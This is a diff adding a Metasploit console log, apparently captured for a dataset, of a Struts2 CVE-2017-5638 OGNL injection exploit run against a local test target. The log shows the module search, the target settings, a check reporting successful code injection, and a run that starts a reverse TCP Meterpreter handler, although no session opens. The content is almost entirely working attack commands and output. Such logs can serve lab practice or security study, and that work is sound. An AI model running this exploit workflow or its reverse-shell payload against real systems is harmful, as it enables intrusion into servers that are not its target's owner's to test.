@@ -1,0 +1,27 @@
+[*] Spooling to file /home/kali/dataset/raw/metasploit/2026-08-04/struts2_s2045/scan.txt...
+resource (/tmp/struts2.rc)> search cve:2017-5638
+
+Matching Modules
+================
+
+   #  Full Name                                     Disclosure Date  Rank       Check  Name
+   -  ---------                                     ---------------  ----       -----  ----
+   0  exploit/multi/http/struts2_content_type_ognl  2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/struts2_content_type_ognl
+
+resource (/tmp/struts2.rc)> use exploit/multi/http/struts2_content_type_ognl
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+resource (/tmp/struts2.rc)> set RHOSTS 127.0.0.11
+RHOSTS => 127.0.0.11
+resource (/tmp/struts2.rc)> set RPORT 18080
+RPORT => 18080
+resource (/tmp/struts2.rc)> set TARGETURI /
+TARGETURI => /
+resource (/tmp/struts2.rc)> check
+[+] 127.0.0.11:18080 - The target is vulnerable. Successfully executed the injected code
+resource (/tmp/struts2.rc)> run
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] Exploit completed, but no session was created.
+resource (/tmp/struts2.rc)> spool off
